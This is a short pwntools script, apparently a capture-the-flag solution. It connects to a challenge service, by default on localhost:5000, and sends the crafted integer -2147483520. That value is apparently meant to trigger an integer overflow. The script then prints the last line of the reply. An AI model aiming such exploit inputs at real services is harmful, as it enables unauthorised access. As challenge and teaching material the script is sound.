#!/bin/python

from pwn import *

host = args.HOST or 'localhost'
port = int(args.PORT or 5000)

io = remote(host, port)

io.sendline(b'-2147483520')

print(io.recvall().split(b'\n')[-1].decode())
